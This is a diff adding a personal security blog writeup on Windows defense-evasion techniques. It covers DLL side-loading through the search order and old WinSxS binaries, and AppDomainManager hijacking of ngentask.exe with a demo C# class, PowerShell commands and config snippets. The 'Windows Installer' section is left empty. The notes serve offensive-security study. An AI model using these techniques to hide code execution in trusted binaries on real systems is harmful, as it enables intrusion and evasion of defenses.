@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>payloads — natashi</title>
+  <meta name="description" content="DLL side-loading this abusees the windows dll search order when an application attempts to load its dependencies :   The...">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+
+  <canvas id="particles"></canvas>
+
+  <nav class="navbar">
+    <a href="../index.html" class="nav-logo">
+      <span class="logo-bracket">[</span>natashi<span class="logo-bracket">]</span>
+    </a>
+    <div class="nav-links">
+      <a href="../index.html" class="nav-link">Home</a>
+      <a href="../writeups.html" class="nav-link">Writeups</a>
+      <a href="../notes.html" class="nav-link">Notes</a>
+      <a href="../about.html" class="nav-link">About</a>
+    </div>
+  </nav>
+
+  <main class="container page-content">
+    <article class="post-article">
+      <div class="post-article-header">
+        <a href="../writeups.html" class="back-link">← Back to Writeups</a>
+        <div class="post-article-meta">
+          <span class="post-category">writeup</span>
+          <span class="post-date">2026-06-25</span>
+        </div>
+        <h1 class="post-article-title">payloads</h1>
+        <div class="post-tags"><span class="post-tag">#windows</span><span class="post-tag">#evasion</span></div>
+      </div>
+      <div class="post-article-body">
+        <h2>DLL side-loading</h2>
+<p>this abusees the windows dll search order when an application attempts to load its dependencies : </p>
+<ul>
+<li><p>The directory the application is in.</p>
+</li>
+<li><p>The system directory, typically <code>C:\Windows\System32</code>.</p>
+</li>
+<li><p>The 16-bit system directory, typically <code>C:\Windows\System</code>.</p>
+</li>
+<li><p>The Windows directory, typically <code>C:\Windows</code>.</p>
+</li>
+<li><p>The current working directory.</p>
+</li>
+<li><p>The directories that are listed in the <code>PATH</code> environment variable.</p>
+</li>
+</ul>
+<p>Use <code>Process Monitor</code> to find hijack oppor : path ends <strong>.dll</strong>  and result is <strong>Name NOT FOUND</strong></p>
+<p>WinSxS (<code>C:\Windows\WinSxS</code>) stores multiple versions of Windows components and DLLs to maintain application compatibility. Old, vulnerable versions may remain after updates, making them potential DLL side-loading targets.</p>
+<p>example of executing old and new version ( the search for certain dll is not the same )</p>
+<p><strong>to search for older versions</strong></p>
+<p><code>PS C:\Users\Attacker&gt; ls -Path C:\Windows\WinSxS -Recurse -Filter ngentask.exe | Select -expand FullName </code></p>
+<p><img src="images/payloads/image-EzbXpOkS.png" alt="New Version"></p>
+<p><img src="images/payloads/image-OqRBhXHM.png" alt="Older Version"></p>
+<h2>AppDomainManager</h2>
+<p>there is a way to load DLLs regardless of the search order in windows ( can be utilised for apps writeen in .NET core 3.1 as we can inject a .NET backdoor to execute before the entrypont of the application )</p>
+<p>write a class that inherits from <code>AppDomainManager</code> ( .NET FRAMEWORK ) and compile it to a .NET DLL </p>
+<p>EXAMPLE :</p>
+<pre><code>using System;
+using System.Windows.Forms;
+
+namespace AppDomainHijack;
+
+public sealed class DomainManager : AppDomainManager
+{
+    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
+    {
+        MessageBox.Show(&quot;Hello World&quot;, &quot;Success&quot;);
+    }
+}
+</code></pre>
+<p>it needs to be on the same directory as the .NET app that we want to hijack example ( in the ngentask.exe)</p>
+<pre><code>PS C:\Users\Attacker&gt; cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe ngentask.exe
+PS C:\Users\Attacker&gt; cp C:\Tools\AppDomainHijack\bin\Debug\AppDomainHijack.dll domainManager.dll
+</code></pre>
+<p>it can be loaded  in two ways : </p>
+<ul>
+<li>via two env variables <code>APPDOMAIN_MANAGER_ASM</code> and <code>APPDOMAIN_MANAGER_TYPE</code> and the just execute the <strong>.exe</strong></li>
+</ul>
+<pre><code>PS C:\Users\Attacker&gt;$env:APPDOMAIN_MANAGER_ASM = &#39;AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&#39;
+PS C:\Users\Attacker&gt;$env:APPDOMAIN_MANAGER_TYPE = &#39;AppDomainHijack.DomainManager&#39;
+</code></pre>
+<p><img src="images/payloads/image-hjQc6QkC.png" alt="image-hjQc6QkC.png"></p>
+<ul>
+<li>second method is to use the two envs  in a conf file  <code>ngentask.exe.config</code></li>
+</ul>
+<pre><code>&lt;configuration&gt;
+   &lt;runtime&gt;
+      &lt;appDomainManagerAssembly value=&quot;AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&quot; /&gt;  
+      &lt;appDomainManagerType value=&quot;AppDomainHijack.DomainManager&quot; /&gt;  
+   &lt;/runtime&gt;
+&lt;/configuration&gt;
+</code></pre>
+<h2>Windows Installer</h2>
+
+      </div>
+    </article>
+  </main>
+
+  <footer class="footer">
+    <p>© 2025 natashi — built with ☕ and curiosity</p>
+  </footer>
+
+  <script src="../script.js"></script>
+</body>
+</html>
